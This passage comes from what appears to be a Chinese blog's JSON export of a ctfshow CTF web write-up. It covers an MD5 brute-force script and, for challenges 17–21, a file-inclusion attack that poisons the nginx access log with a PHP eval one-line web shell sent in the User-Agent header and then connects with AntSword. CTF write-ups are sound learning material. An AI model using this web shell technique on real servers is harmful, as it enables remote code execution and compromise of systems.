variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ctfshow<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"a6f57ae38a22448c2f07f3f95f49c84e\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"nonono!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>爆破</p>\n<p>代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>str1 <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> str1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            s <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow'</span><span class=\"token operator\">+</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token comment\"># print(type(s))</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token string\">'a6f57ae38a22448c2f07f3f95f49c84e'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>k<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-1718192021\"><a class=\"anchor\" href=\"#web-1718192021\">#</a> web 17/18/19/20/21</h1>\n<p>17</p>\n<p>18 过滤了 file</p>\n<p>19 过滤了 base</p>\n<p>20 过滤了 rot</p>\n<p>21 过滤了： c 传参过滤掉 php</p>\n<p>思路：</p>\n<p>include 文件包含</p>\n<p>利用日志文件包含，访问日志文件： <code>?c=/var/log/nginx/access.log</code></p>\n<p>发现日志文件记录了  <code>user-agent</code>  头，于是在该头中插入一句话木马： <code>&lt;?php eval($_POST['a']);?&gt;</code></p>\n<p>然后可使用蚁剑连接，密码即为  <code>a</code>  然后看到有  <code>36d.php</code> ，打开后得到 flag</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        }
    ]
}